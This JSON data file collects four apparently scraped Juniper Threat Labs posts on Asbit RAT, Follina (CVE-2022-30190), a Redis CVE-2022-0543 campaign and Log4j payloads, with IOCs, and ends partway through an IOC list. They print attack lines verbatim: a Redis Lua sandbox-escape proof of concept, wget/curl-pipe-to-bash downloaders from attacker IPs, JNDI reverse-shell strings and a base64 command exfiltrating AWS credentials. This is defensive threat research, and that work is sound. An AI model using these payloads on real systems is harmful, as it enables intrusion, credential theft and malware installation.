{
    "data": [
        {
            "https://blogs.juniper.net/en-us/threat-research/asbit-an-emerging-remote-desktop-trojan": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2022-08-31",
                    "source": "blogs.juniper.net"
                },
                "text": "Introduction Juniper Threat Labs is currently monitoring an emerging Chinese Remote Desktop Trojan called Asbit. It’s a remote access Trojan being advertised on its developer’s website as a “Fast Remote Desktop”. This RAT first made its appearance in 2021 and kept updating its infrastructure and features as it went along. It uses a number of strategies to avoid endpoint and network detection. By using DNS over HTTPS (DoH) to resolve the IP addresses of its control servers, it aims to get past network DNS filters. The domain asbit[.]cn was registered on January 31, 2021. This domain was used to host the malware and its modules. It also hosts the threat actor’s website. The website is still live at the time of this publication. Recently, the threat actor registered another domain and website, rdlite[.]com . The new website looks like a copy of the previous website. The website www.asbit.cn translated to English. It advertises itself as “Fast Desktop”, a secure remote desktop application for IT professionals. Timeline To provide an understanding of the Asbit operation, below is a timeline of their infrastructure. The domain, asbit[.]cn was registered on January 31, 2021. At that time, it resolved to IP 47.111.81.199 .  Later in the year 2021, the threat actors registered mitm[.]work and fmt[.]ink . At this time, the servers are hosted on Linux servers. In 2022, they registered the domain def[.]cab, rfb[.]ink and rdlite[.]com . Around June of 2022, we also see a shift of the OS they used in hosting these servers. Based on third-party server fingerprinting services like Shodan and Cencys, we found that they shifted to Windows OS and used IIS. It’s unclear to us why they shifted to Windows. Domain Creation Date DNS Resolution ASN Country First Seen Last Seen OS asbit.cn January 31, 2021 47.111.81.199 Hangzhou Alibaba Advertising Co.,Ltd. China 2021-01-31 14:12:49 2021-10-22 5:50:25 Linux 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2021-10-23 0:35:40 2021-12-21 0:35:50 Linux 43.156.37.105 Tencent Cloud Computing (Beijing) Co., Ltd China 2021-12-22 15:42:42 2021-12-22 15:42:42 Linux mitm.work May 24, 2021 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. China 2021-06-04 18:11:34 2021-12-15 8:34:51 Linux 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-15 5:41:34 2022-07-12 4:04:09 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 4:30:38 2022-08-01 0:33:24 Windows, IIS server fmt.ink September 4, 2021 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2021-09-06 2:23:53 2022-05-20 8:39:50 Linux 43.154.211.60 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-05-20 9:07:51 2022-06-19 17:40:10 Unknown 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-15 5:20:32 2022-07-12 4:27:52 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 5:10:32 2022-08-01 1:56:23 Windows, IIS server def.cab May 6, 2022 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. China 2022-05-08 23:00:04 2022-05-08 23:00:04 Linux 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-07-12 9:55:52 2022-07-26 21:07:26 Windows, IIS server rfb.ink February 24, 2022 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2022-05-14 13:07:32 2022-05-18 7:20:44 Linux 43.154.211.60 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-05-21 15:34:34 2022-06-03 2:41:55 Unknown 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-03 15:32:50 2022-07-12 8:58:52 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 9:50:46 2022-07-25 11:51:59 Windows, IIS server rdlite.com June 8, 2022 104.21.10.90 Cloudflare United States 2022-06-08 17:26:55 2022-08-10 2:16:40 Unknown 172.67.162.192 Cloudflare United States 2022-06-08 17:26:55 2022-08-10 2:16:40 Unknown Early Version of asbit RAT The earliest version of the malware we could find dates back to May 2021. It included a series of loader modules which will eventually download the core module. The malware is typically bundled with installers. It starts by dropping the loader module that installs another DLL as a service. The installed service further downloads and executes the core module. The core module has remote desktop functionality and other capabilities, including command execution and keystroke injection. The malicious installer ( 806523a9e4021cd72691fbdeb229339a24984b7ca79c3860ba468c832bf95c4d ) drops the loader modules C:\\2.0.50727 and C:\\4.0.30319 . The files appear to be folders of the .NET framework, but they are in fact files. This is likely done by the author to obscure itself and try to evade endpoint detection. It also drops a malicious libexpat.dll ( 018656e61c7c5fc8d5983a32507fbcf379dd9e2b5dd7d67b8e44590d46a8c51f ) and a benign XLSP.dll ( cca2ea493c8402ed24c9c93328066ae0ce451059e2f954929f24ab7481119b6c ). The installer drops the components in the C:\\ directory. Loader Module The loader module starts with the dropped C:\\2.0.50727 or C:\\4.0.30319. It executes either of these files using RegAsm.exe , an assembly registration tool that is used to load .NET assembly files. C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe /u \"C:\\4.0.30319\" The \"/u\" parameter, which means \"Unregister “, is part of the command to install this module. This could be interpreted as being used to remove the module. However, the module itself has an “Unregister” function that does the opposite. It creates a service for libexpat.dll that further downloads additional modules, including the core module. Unregister function in the loader module that installs 2 DLLs as a service. Once the libexpat.dll service is installed and running, it downloads 2 additional modules. One is a module that creates a web proxy ( f223ceb9830ed18d823f42d9d8d5c09429782e0bcdbc62da5f00c881964e7041 ) and the other is the core module ( 4b1efadc55c0cc3471e0945804125317b2a75772393541f680b1617f8a42773d ). Second Loader Module This module installs a browser proxy by downloading a Proxy Auto-Configuration (PAC) file from 47.111.81.199 . This allows the threat actor to act as a Browser-in-the-Middle by making all requests from the browser proxied to the threat actor’s server. Installation of the PAC file also includes installation of the threat actor’s certificate. Function that download and install a PAC file The certificate installed by asbit malware. Lastly, the module contacts “rat.t.com” to report the newly infected system. The system information which includes MAC address, OS, CPU and date is hashed and sent as the ID. Core Module The core module is a fully functional RAT. It has a hard coded server to where it connects to, which is 47.111.81.199:6000 . It also includes several functionalities including command execution and keystroke injection. Below are the list of functions it can perform: Capture Screenshots Run TightVNC for Remote Desktop Control Control Mouse Movements Inject Keystrokes Kill Process by PID Download Files Execute Commands Collect Installed Certificates An interesting function of this RAT is that it uses TightVNC for its remote desktop functions. We also found other variants of this malware that use UltraVNC instead of TightVNC. Function in the core module that uses TightVNCServer. WinVNC.exe process seen during execution of the malware. Latest Version As we noted in the “Timeline” section, the threat actor changed its infrastructure. It shifted to the following domains for its download and control servers. ink ink cab work They have also added functionality to bypass network security using DNS over HTTPS (DoH) and added a separate module solely for Remote Desktop using the RDPSession Class built in Windows. Installer We found the installer distributed as .pif files. Some of these files were seen as discord attachments, which indicates how the threat actors used Discord as an infection vector. Below are some of the installer files we found: Filename : Photo_2022-07-10_19-23-19.pif Sha256 : 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 ITW URL : https://cdn.discordapp.com/attachments/911561368359039026/995990526950117406/photo_2022-07-10_19-23-19.pif Filename : Need to download attachments.pif Sha256 : C5a720c2460da4c49b912409b204fbec31c79af3f7aaa011a3e679645f060760 ITW URL : Unknown Filename : WhatsAppSMS reception.txt Sha256 : a2cdf57b6a1cbf36d0440feedb2d9593e81cf646fd6f736a66d32950c1fa6857 ITW URL : Unknown The following analysis is based on the installer 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 . The installer drops the loader module and libexpat.dll . It has a slightly different install command than the first version. It still uses RegAsm.exe to load the loader module but now it drops it in C:\\ with a random filename not with a .NET folder-like name. Libexpat.dll is also dropped in C:\\ProgramData. \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" /u \"C:\\kfdjvzx5.5ie\" dd99e3acca16b02fa947b0742acfdc0a entry The loader module, C:\\kfdjvzx5.5ie installs libexpat.dll as a service. Libexpat.dll further downloads the following additional modules. Core Downloaded from http://106[.]12.129.126/build?project=loader.core&version=4.0.30319 Downloads the core Module Has functions to uninstall itself and the malware Core Module Downloaded from http://106[.]12.129.126/build?project=client.core&version=4.0.30319 as a gzip file Uses DoH to determine the IP of ddns.b.rdlite.com where it can download the rdp module. Rdp Client Module Downloaded from http://222[.]210.157.249:1024/build?project=rdp.client.core&version=4.0.30319&t=28069859 Uses DoH to determine the IP of its control server (v2.team.rfb.ink:5100) Core Module The new core module includes functions such as capture screenshots, inject keystrokes and execute commands, but we noticed a much cleaner programming style hinting active development of the malware. We also noticed it added several functions, particularly handlers, for example, vnc, rfb and p2p functions. Another interesting function is the use of DNS over HTTP (DoH) to query the ip address of its control servers. For instance, the domain name of the file server where it hosts the rdp module could be any of the following domains: a.rdlite.com:1024 b.rdlite.com:1024 w.rdlite.com:1024 However, it does not use the traditional way of getting the IP address, which is connecting to the DNS at port 53 using UDP. Rather, it gets the IP address using DNS over HTTP (DoH). Below is a query for the IP address of ddns.b.rdlite.com using Alibaba DoH server. GET /resolve?name=ddns.b.rdlite.com&short=true&_=28042000 HTTP/1.1 Host: 223.5.5.5 Connection: Keep-Alive [\"222.210.157.249\"] Currently, it can either use AliDns or DnsPod DoH servers. Using DoH makes the malware more resilient against network filters that rely on traditional DNS queries for blocking domains. For example, a network filter that blocks the domain ddns.b.rdlite.com won’t be able to block the request because it can only see the HTTP request to DoH servers (e.g., Alibaba or DnsPod). The way to block this request is to directly block the IP address associated with the domain. It’s interesting to note however that the malware author did not use HTTPS which will make it more resilient as such requests are encrypted. RDP Client Module This module is mainly for remote desktop control as the name implies. The old versions relied on commercial or free remote desktop applications, such as TightVNC or UltraVNC while the latest version implements its own RDP. It does this by using the built-in Windows RDP application. It works by creating an RDP Session instance by using the CLSID ( 9B78F0E6-3E05-4A5B-B2E8-E743A8956B65 ) which is the RDPSession Class in Windows. The RDP modules control server is v2.team.rfb.ink:5100 , and it also uses DoH to determine the IP of its control server. Conclusion In this blog, we have detailed the evolution of an emerging Chinese remote desktop trojan. We have identified some of its capabilities and its infrastructure and how it tries to evade endpoint and network detection. We believe that this RAT is in its early development but it’s actively being developed. It’s likely that we will see future versions of this malware with enhanced capabilities and new ways of evading endpoint and network detection. Juniper ATP Cloud detects this malware using Machine Learning based on behavioral analysis engine. Indicators of Compromise asbit[.]cn mitm[.]work rdlite[.]com fmt[.]ink def[.]cab rfb[.]ink 47[.]111[.]81[.]199 43[.]128[.]31[.]158 43[.]156[.]37[.]105 43[.]154[.]232[.]199 119[.]28[.]78[.]209 43[.]154[.]211[.]60 104[.]21[.]10[.]90 172[.]67[.]162[.]192 806523a9e4021cd72691fbdeb229339a24984b7ca79c3860ba468c832bf95c4d 018656e61c7c5fc8d5983a32507fbcf379dd9e2b5dd7d67b8e44590d46a8c51f f223ceb9830ed18d823f42d9d8d5c09429782e0bcdbc62da5f00c881964e7041 4b1efadc55c0cc3471e0945804125317b2a75772393541f680b1617f8a42773d 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 C5a720c2460da4c49b912409b204fbec31c79af3f7aaa011a3e679645f060760 a2cdf57b6a1cbf36d0440feedb2d9593e81cf646fd6f736a66d32950c1fa6857"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/cve-2022-30190-microsoft-windows-support-diagnostic-tool-msdt-remote-code-execution-vulnerability": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2022-06-08",
                    "source": "blogs.juniper.net"
                },
                "text": "A zero-day vulnerability was discovered on Microsoft Windows Support Diagnostic Tool (MSDT). On May 27, a researcher who goes by the twitter handle nao_sec discovered an interesting Microsoft Word d ocument submitted from Belarus. The document calls out to an external HTML file which uses ms-msdt URL protocol to execute Powershell code. Assigned CVE-2022-30190 , Microsoft recently released an advisory to mitigate the impact of this exploit. How the Exploit Works First, in a Microsoft Word file, an HTML file is referenced externally in “ word\\_ rels \\ document.xml.rels ”. This file is responsible for defining relationships associated with embedded objects in the document. In this case, the relationship being referred to is an OLE object. OLE objects are part of Microsoft’s proprietary Object Linking and Embedding technology, which allows external documents, such as an Excel spreadsheet, to be embedded within a Word document. The external HTML file is a javascript that uses the MSDT URL scheme, “ ms-msdt:/ ” followed by arguments, which include Powershell commands, to be able to execute code. The payload for the following PoC is base64 encoded. The padding is needed because at least 4096 bytes is needed for this exploit to trigger. In the Wild Attacks The following are documents we have seen in-the-wild that exploit this vulnerability. Due to the sensitivity of some of the documents, we have redacted parts of the document contents. 05-2022-0438.doc Sha256: 4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784 This is the file first discovered by naosec that triggered the disclosure of this exploit. The file was first uploaded to VirusTotal on May 27 from an IP address geolocated in Belarus. The doc file references the following html file: https://www[.]xmlformats[.]com/office/word/2022/wordprocessingDrawing/RDF842l.html ! This HTML contains the “ms-msdt:/” URI scheme followed by arguments and a Powershell code. The payload is base64 encoded. The decoded payload is another Powershell script , which kills the process of msdt.exe and extracts 05-2022-0438.rar into rgb.exe Inside RDF842l.html. Highlighted part is the base64 encoded payload Base64 decoded payload We don’t know the nature of rbg.exe as we are unable to get a copy of the R ar file or rgb .exe. Exposing_Sonish_Liar!!!.doc Sha256: D61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7 This file was first submitted to VirusTotal on April 8, 2022. It references the following HTML file, “ https://exchange[.] oufca [.]com.au/ owa /auth/15.1.2375/themes/p3azx.html! ” , which leads to “ test.cab ” , which download s a base64 encoded Cobalt Strike BEACON from “ 160.20.145.111 ” . CSAFP’S_GUIDANCE_RE_NATIONAL_AND_LOCAL_ELECTION_2022_NLE.docx Sha256: d118f2c99400e773b8cfd3e08a5bcf6ecaa6a644cb58ef8fd5b8aa6c29af4cf1 This file was uploaded to Virustotal on May 5, 2022. It appears to be a memorandum sent to Philippine Armed Forces regarding securing the National Election. The election was held on May 9, 2022. It references an HTML file from http://141[.]98.215.99/color.html . РЭТ-ЮМ-3044 от 12.04.2022.doc Sha256: fe300467c2714f4962d814a34f8ee631a51e8255b9c07106d44c6a1f1eda7a45 This file was uploaded to VT on April 13, 2022. It references the HTML from “ https://www[.]sputnikradio.net/radio/news/1134.html !”. We are unable to get a copy of the HTML file . VIP Invitation to Doha Expo 2023.rar Sha256: d6be967d250f0be8e212cff9264fd0391a33f2ac00efeb508f7b79fca2fdf989 This file was first submitted to VT on June 1, 2022 , presumably as an email attachment. Inside this Rar file is a document, VIP Invitation to Doha Expo 2023.docx , with sha256sum of 4fdec1c9111132a7f57fabfa83a6b7f73b3012d9100a790deaa53df184c1d4c4 . It references an HTML file from https://files[.]attend-doha-expo[.]com/inv.html . The HTML retrieves a file from SMB share on 5.206.224.233 , maps it into z: drive and executes a file on that share , osupdate .exe . The nature of osupdate.exe is unknown as we are not able to retrieve this file. Juniper Advance Threat Protection (ATP) was able to natively detect this threat without the need for update or signature, using behavioral analysis and machine learning. On-premise ATP detection Cloud ATP detection Indicators of Compromise Hashes 4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784 05-2022-0438.doc d61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7 Exposing_Sonish_Liar!!!.doc 61f63946a6f15ce0b7fc5f79f997daf4634003b38cc46ca24ff48154dfe754dd test.cab 80a138b77e2dc37b2165ac74d758e1f9eda34e7661f1479c9c76f9e038927e17 test.exe 5327c76b0a4d034dbc01721e0f9c300d61f0bdfba2f1076e9261e4d41a6afb76 Cobalt Strike fe300467c2714f4962d814a34f8ee631a51e8255b9c07106d44c6a1f1eda7a45 РЭТ-ЮМ-3044 от 12.04.2022.doc d6be967d250f0be8e212cff9264fd0391a33f2ac00efeb508f7b79fca2fdf989 VIP Invitation to Doha Expo 2023.rar 4fdec1c9111132a7f57fabfa83a6b7f73b3012d9100a790deaa53df184c1d4c4 VIP Invitation to Doha Expo 2023.docx d118f2c99400e773b8cfd3e08a5bcf6ecaa6a644cb58ef8fd5b8aa6c29af4cf1 CSAFP’S_GUIDANCE_RE_NATIONAL_AND_LOCAL_ELECTION_2022_NLE.docx URL https://files[.]attend-doha-expo.com/inv.html https://www[.]sputnikradio.net/radio/news/1134.html https://exchange[.]oufca[.]com.au/owa/auth/15.1.2375/themes/p3azx.html https://www[.]xmlformats[.]com/office/word/2022/wordprocessingDrawing/RDF842l.html 5[.]206.224.233 160[.]20.145.111 Reference https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/"
            }
        },
        {
            "https://blogs.juniper.net/en-us/security/muhstik-gang-targets-redis-servers": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2022-03-25",
                    "source": "blogs.juniper.net"
                },
                "text": "Juniper Threat Labs has uncovered an attack that targets Redis Servers using a recently disclosed vulnerability, namely CVE-2022-0543. This vulnerability exists in some Redis Debian packages. The attack started on March 11, 2022 from the same threat actor we’ve seen targeting confluence servers back in September 2021 and the same group targeting Log4j back in December. The payload used is a variant of Muhstik bot that can be used to launch DDOS attacks CVE-2022-0543: Redis Lua Sandbox Escape and Remote Code Execution “ Redis is a very widely used service for caching, but it’s also used as a message broker. Clients talk to a Redis server over a socket, send commands, and the server changes its state (i.e. its in-memory structures), in response to such commands. Redis embeds the Lua programming language as its scripting engine, which is made available through the eval command. The Lua engine is expected to be sandboxed , i.e., clients can interact with the Redis APIs from Lua, but should not be able to execute arbitrary code on the machine where Redis is running.“ – Reginaldo Silva In January 2022, Reginaldo Silva discovered a vulnerability in Redis (Debian-specific) that allows Lua sandbox escape. A remote attacker with the ability to execute arbitrary Lua scripts could escape the Lua sandbox and execute arbitrary code on the host. This vulnerability existed because the Lua library in some Debian/Ubuntu packages is provided as a dynamic library (Ubuntu Bionic and Trusty are not affected). When the Lua interpreter initializes, the “ package ” variable is automatically populated, and that in turn permitted access to arbitrary Lua functionality. For instance, we can use “ package.loadlib” to load the modules from “ liblua ” library, then use this module to execute commands. The following is a proof of concept on how to exploit this vulnerability. local io_l = package.loadlib (\"/ usr /lib/x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \" ); local io = io_l (); local f = io.popen (\" cat / etc /passwd \", \"r\"); local res = f:read(\"*a\"); f:close(); return res To demonstrate this attack, we instantiated a vulnerable Redis server and launched the above Lua scripts using the “ eval ” command. As you can observe from the screenshot below, we are able to achieve code execution by dumping the contents of / etc /passwd . Proof of concept of executing system commands inside the Redis session Payload: Muhstik bot timeline of attacks on CVE-2022-0543 On March 11, Juniper Threat Labs observed attacks launching this exploit from our telemetry. The attack attempts to download “ russia. sh ” using wget or curl from “ 106[.]246.224.219 ”. It saves it as “ / tmp / russ ” and executes it. eval 'local io_l = package.loadlib (\"/ usr /lib/x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \"); \r\nlocal io = io_l (); \r\nlocal f = io.popen (\"( wget -O / tmp / russ http://106[.]246.224.219/russia.sh || curl -o / tmp / russ http://106[.].246.224.219/russia.sh ); chmod 700 / tmp / russ ; / tmp / russ \" , \"r\"); \r\nlocal res = f:read (\"*a\"); f:close (); return res' 0 contents of russia.sh This script (russia.sh) will further download and execute linux binaries from 160[.]16.58.163. These binaries are identified to be variants of Muhstik bot. This bot connects to an IRC server to receive commands which include the following: Download files Shell commands Flood attacks SSH brute force Strings inside Muhstik bot indicating its capabilities Threat Actor We mapped the originating IP of these attacks to figure out if these are related to some groups we are tracking. We found that the following IPs was used in the past to launch attacks: 170[.]210.45.163 191[.]232.38.25 79[.]172.212.132 For instance, the IP 191.232.38.25 was used in September 2021 to launch attacks on Confluence Servers exploiting CVE-2021-26084. We have documented that attack here . It’s worth noting that the group is still using the same Muhstik bot. The same IP was again used in December to launch attacks on Apache Log4j. Timeline of observed attacks launched from 191[.]232.38.25 Conclusion We advise those who may be vulnerable to patch their Redis service. Debian and Ubuntu have also released security advisories regarding this matter. Links are below: Debian Advisory Ubuntu Advisory Indicators of Compromise 4817893f8e724cbc5186e17f46d316223b7683dcbc9643e364b5913f8d2a9197  pty1 46389c117c5f41b60e10f965b3674b3b77189b504b0aeb5c2da67adf55a7129f  pty10 95d1fca8bea30d9629fdf05e6ba0fc6195eb0a86f99ea021b17cb8823db9d78b  pty2 7d3855bb09f2f6111d6c71e06e1e6b06dd47b1dade49af0235b220966c2f5be3  pty3 16b4093813e2923e9ee70b888f0d50f972ac607253b00f25e4be44993d263bd2  pty4 28443c0a9bfd8a12c12a2aad3cc97d2e8998a9d8825fcf3643d46012f18713f0  pty5 36a2ac597030f3f3425153f5933adc3ca62259c35f687fde5587b8f5466d7d54  russia.sh Download IP 106[.]246.224.219 160[.]16.58.163 Attacker IP 104[.]236.150.159 170[.]210.45.163 146[.]185.136.187 178[.]62.69.4 191[.]232.38.25 79[.]172.212.132 221[.]120.103.253 Reference: https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543 https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543"
            }
        },
        {
            "https://blogs.juniper.net/en-us/security/in-the-wild-log4j-attack-payloads": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-12-18",
                    "source": "blogs.juniper.net"
                },
                "text": "Juniper Threat Labs compiled a list of the payloads from log4j attacks we have seen as of 12/16. Most of the payloads install malware such as Muhstik, Kinsing, Mirai and Cryptominers. We have also seen installation of a file infector malware. We have also observed malicious attacks that open a reverse shell on the target, as well as attacks that attempt to dump AWS credentials. There are also a large number of benign scans coming from test or security organizations. To be able to have a better understanding of the attacks, we will briefly detail how this specific attack works. The majority of the attacks have the strings “Basic/Command/Base64/ ” or “ Basic/ReverseShell”. GET /$%7Bjndi:ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0Y<redacted> %7D HTTP/1.1 Host:<redacted> User-Agent: ${jndi:ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0YzAwMDBhcTY5MGdkcGcxNG<redacted> } GET / HTTP/1.0 User-Agent: borchuk/3.1 ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell/ <redacted_ip>/9999 } Accept: */* Bearer: ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell / <redacted_ip>/9999 } These attacks are initiated using a tool called “JNDIExploit”, a java-based exploitation framework that specifically targets JNDI vulnerabilities. Local JNDI vulnerabilities have existed in the past before Log4j exposed them to the outside world. At Blackhat 2016, researchers presented their paper on JNDI attacks. The JNDIExploit tool can start its own LDAP and HTTP server and is capable of receiving different types of payloads, including command execution and reverse shell. JNDIExploit usage For instance, when the URL has the “ Basic/Command” string, it will execute whatever command is in the URL after that. If the URL has the “Basic / ReverseShell ” string, it will invoke a reverse shell. It does this by dynamically generating a Java class that will perform the command and sends the location of that Java class as a response to the LDAP query. It will also host that Java class using its o wn HTTP server so that the vulnerable server can download it and thus results into remote code execution (RCE) Commands in JNDIExploit CommandTemplate.class ReverseShellTemplate.class This tool was initially deployed on GitHub in November 2020 but the original repo has been taken down; however, multiple clones of this tool resurfaced on Github. Malware Installation The following is a list of malware families we discovered that resulted from exploitation of the log4j vulnerability CVE-2021-44228. Muhstik Bot First sighting exploiting CVE-2021-44228: December 11, 2021 The attacker sends the following request to a vulnerable server whic h leads to download and execution of Exploit.class on the target. This Java class downloads ‘log ’ from 68[.]183.165.105 in Linux environments and ‘ s. cmd ’ from 172[.]105.241.146 on Windows environments using powershell . Log is a shell script that downloads multiple pty ELF files, each built for a different architecture (i.e., MIPS, ARM, Intel ) . These are variants of Muhstik bot which is the same malware targeting Confluence servers back in September . S.cmd is a powershell script that installs Monero miner and saves the earnings from the mining to this wallet “46QBumovWy4dLJ4R8wq8JwhHKWMhCaDyNDEzvxHFmAHn92EyKrttq6LfV6if5UYDAyCzh3egWXMhnfJJrEhWkMzqTPzGzsE”. Exploit.class downloads Muhstik bot when in Linux and XMRig when on Windows Here are the corresponding sha256 hashes of the downloaded files we have seen: c39eb055c5f71ebfd6881ff04e876f49495c0be5560687586fc47bf5faee0c84  pty1 33dd6c0af99455a0ca3908c0117e16a513b39fabbf9c52ba24c7b09226ad8626  pty2 4c97321bcd291d2ca82c68b02cde465371083dace28502b7eb3a88558d7e190c  pty3 b0a8b2259c00d563aa387d7e1a1f1527405da19bf4741053f5822071699795e2  pty4 2752deb9f9f9602ca0c7bd41c3171d1560b929b6a4221ab07b0bf872d042f7e7  pty5 A290b6f956ecdb3d2d2019088f0b01a93a9f680c82a4680c0fb87eb5e3e64897  log C70e6f8edfca4be3ca0dc2cfac8fddd14804b7e1e3c496214d09c6798b4620c5  s.cmd s.cmd code that installs XMRig Kinsing Malware First sighting exploiting CVE-2021-44228: December 11, 2021 The attacker in this case seems to have used the JNDIExploit tool, given the presence of “Basic/Command/Base64” in the string. The base64 encoded string is a command to download a shell script lh.sh (3ba2c4ae64be8d03747dffd5e4dc98730a54fdbb4aad50516428dc2507fdbfcf). ( curl -s 92[.]242.40.21/lh. sh || wget -q -O- 92[.]242.40.21/lh.sh)| bash The script will in turn download the Kinsing binary (6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b) from the same IP. Inside lh.sh shell script Other attacks installing Kinsing Malware are as follows: (curl -s 82[.]118.18.201/lh.sh|| wget -q -O- 82[.]118.18.201/lh.sh)|bash - base64 decoded 68cc0ae1ca1e26d5f1dba19d065291ae6c5c69c9f37b9f384245d6fa070f1d69  - Kinsing Binary Mirai First sighting exploiting CVE-2021-44228: December 15, 2021 The attack also used the JNDIExploit tool. The base64 encoded string is as follows: wget http://152[.]67.63.150/py; curl -O http://152[.]67.63.150/py; chmod 777 py; ./py rce.x86 This gets executed on the target which will download ‘py’ binary, a variant of the Mirai bot. Virus.Mikcer First sighting exploiting CVE-2021-44228: 2021-12-15 The following attack specifically targets Apache Solr based on the GET request. The attacker-controlled LDAP server sends ExecTemplateJDK8.class, which gets executed on the target. This class will download log4tst.exe using certutil from 182.131.31.122:5367. The binary is a v ariant of Virus.Mikcer ( a.k . a . Wapomi ) which is a type of file infector. This type of malware finds Windows executable program (e.g.,  .exe in ProgramFiles folder) as a host and infects it by injecting its malicious code making that file also capable of in fecting other executables. 70ffac4b8f2cf00a6876b3aa622c0efa87b53b681791302eea27692dd81f273d *ExecTemplateJDK8.class 85e88e7bdd4657422a121146600c71250d68b44a82b9677856ffda9dbec07d98 *log4tst.exe CryptoMiners First sighting exploiting CVE-2021-44228: 2021-12-11 A lot of the attacks also install CryptoMiner such as the following: They utilize the JNDIExploit tool to execute the following on the target: echo &(wget -O - http://209[.]141.58.149:8005/aa0||curl -o - http://209[.]141.58.149:8005/aa0)|/bin/bash The target downloads a shell script with filename aa0 which will then downloads an ELF binary, lz, a Monero Miner. f42915a2c76a29edd58fc2e1f7fde4c15d369e141d384064203ac57d53c41d5e *aa0 7ef631659c6f66719a18330ca3a79e89a9297681087659b8aa903c23c9e98be2 *lz Another request that leads to coinminer is the following: Reverse Shell First sighting exploiting CVE-2021-44228: December 14, 2021 We have seen attacks that try to open a reverse shell using JNDIExploit. The following request opens a reverse shell to 167[.]99.32.139:1389 Exfiltrating Sensitive Information Aside from making the target install malware, an attack can also exfiltrate sensitive information from the target. For instance, we have seen attacks that attempt to dump AWS credentials. Benign Scanning W e have also seen a significant amount of scanning that looks just like a test or done by security researchers or organizations. Binaryedge.io LeakIX Just a test where the callback is on localhost and only interested in the version of JAVA the target is using. Kryptoslogic Shifting to RMI and IIOP Most of the attacks we have seen used LDAP but recently, attackers are shifting to RMI and IIOP. We have detailed a complete chain using RMI infection in our previous blog . Attackers used the RMI protocol to install Monero Cryptominer Attackers used the IIOP protocol. Juniper Threat Labs continues to monitor attacks related to the Log4j vulnerability to share IOCs with th e community and add mitigations and protections across the suite of Juniper Networks security products. Indicators of Compromise IP Address 45[.]83.193.150 68[.]183.165.105 172[.]105.241.146 54[.]210.230.186 18[.]228.7.109 45[.]130.229.168 92[.]242.40.21 82[.]118.18.201 152[.]67.63.150 135[.]148.143.217 182[.]131.31.122 209[.]141.58.149 185[.]250.148.157 167[.]99.32.139 176[.]32.33.14 128[.]90.61.199 134[.]209.163.248 135[.]148.143.217 139[.]59.175.247 14[.]192.5.36 14[.]215.128.148 159[.]223.5.30 163[.]172.157.143 167[.]172.44.255 167[.]71.13.196 167[.]99.32.139 176[.]32.33.14 178[.]79.157.186 182[.]131.31.122 185[.]224.139.151 185[.]244.214.217 185[.]250.148.157 193[.]3.19.1 193[.]3.19.159 195[.]54.160.149 205[.]185.115.217 209[.]141.58.149 45[.]130.229.168 45[.]137.21.9 45[.]155.205.233 45[.]83.193.150 45[.]83.64.1 51[.]38.92.223 62[.]182.80.168 80[.]71.158.44 82[.]118.18.201 85[.]10.195.175 92[.]242.40.21 URL https://c6td5me2vtc0000aq690gdpg14eyyyyyb[.]interactsh.com Files c39eb055c5f71ebfd6881ff04e876f49495c0be5560687586fc47bf5faee0c84  pty1 33dd6c0af99455a0ca3908c0117e16a513b39fabbf9c52ba24c7b09226ad8626  pty2 4c97321bcd291d2ca82c68b02cde465371083dace28502b7eb3a88558d7e190c  pty3 b0a8b2259c00d563aa387d7e1a1f1527405da19bf4741053f5822071699795e2  pty4 2752deb9f9f9602ca0c7bd41c3171d1560b929b6a4221ab07b0bf872d042f7e7  pty5 A290b6f956ecdb3d2d2019088f0b01a93a9f680c82a4680c0fb87eb5e3e64897  log 